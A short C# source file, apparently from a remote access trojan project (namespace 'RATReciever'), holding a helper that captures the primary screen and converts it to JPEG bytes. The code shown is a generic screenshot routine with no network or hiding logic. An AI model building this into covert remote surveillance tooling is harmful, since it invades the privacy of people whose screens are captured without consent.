using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.IO;
namespace RATReciever
{
    class Generics
    {
        public class Imaging
        {
        public static Bitmap Get_ScreenShot_In_Bitmap()
        {
            //get the size of primary screen
            Rectangle Rect = Screen.PrimaryScreen.Bounds;

            //define the size of screen and Bit per pixel
            Bitmap bitmap = new Bitmap(Rect.Width, Rect.Height, GetBitsPerPixel());

            Graphics graphic = Graphics.FromImage(bitmap);

            //screenshot of primary display
            graphic.CopyFromScreen(Rect.Left, Rect.Top, 0, 0, Rect.Size);
            return bitmap;
        }

        private static PixelFormat GetBitsPerPixel()
        {
            int BitsPerPixel = Screen.PrimaryScreen.BitsPerPixel;
            PixelFormat pFormat;
            switch (BitsPerPixel)
            {
                case 8:
                case 16:
                    pFormat = PixelFormat.Format16bppRgb565;
                    break;

                case 24:
                    pFormat = PixelFormat.Format24bppRgb;
                    break;

                case 32:
                    pFormat = PixelFormat.Format32bppArgb;
                    break;

                default:
                    pFormat = PixelFormat.Format32bppArgb;
                    break;
            }

            return pFormat;
        }

        public static byte[] ImageToByte(Image bmp)
        {
            MemoryStream ms = new MemoryStream();
            // Save to memory using the Jpeg format
            bmp.Save(ms, ImageFormat.Jpeg);

            // read to end
            byte[] bmpBytes = ms.GetBuffer();
            bmp.Dispose();
            ms.Close();

            return bmpBytes;
        }
        }


    }
}
